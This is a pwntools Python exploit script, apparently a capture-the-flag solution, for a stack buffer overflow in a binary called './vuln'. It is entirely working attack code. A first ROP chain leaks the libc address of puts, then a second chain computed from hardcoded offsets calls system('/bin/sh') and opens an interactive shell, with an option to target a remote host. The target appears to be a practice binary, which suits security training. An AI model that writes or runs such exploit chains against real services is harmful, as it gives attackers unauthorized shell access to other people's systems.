from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
b *0x400770
continue
'''.format(**locals())


exe = './vuln'
elf = context.binary = ELF(exe, checksec=False)
# warning/info/debug
context.log_level = 'info'

offset = 136
pop_rdi = 0x400913

io = start()
payload = flat({
    offset: [
        pop_rdi,
        elf.got.puts,
        elf.plt.puts,
        elf.symbols.main,
    ]
})


io.sendlineafter(' sErVeR!\n', payload)
io.recvline()
puts_addr = u64(io.recvline()[:6].ljust(8, b"\x00"))

log.info("puts addr: %#x", puts_addr)
puts_offset = 0x80a30
libc_base = puts_addr - puts_offset
log.info("libc_base: %#x", libc_base)
system_offset = 0x4f4e0
system_addr = libc_base + system_offset
binsh_addr = libc_base + 0x1b40fa
ret_ins = 0x40052e

payload = flat({
    offset: [
        pop_rdi,
        binsh_addr,
        ret_ins,
        system_addr,
    ]
})
io.sendline(payload)
io.interactive()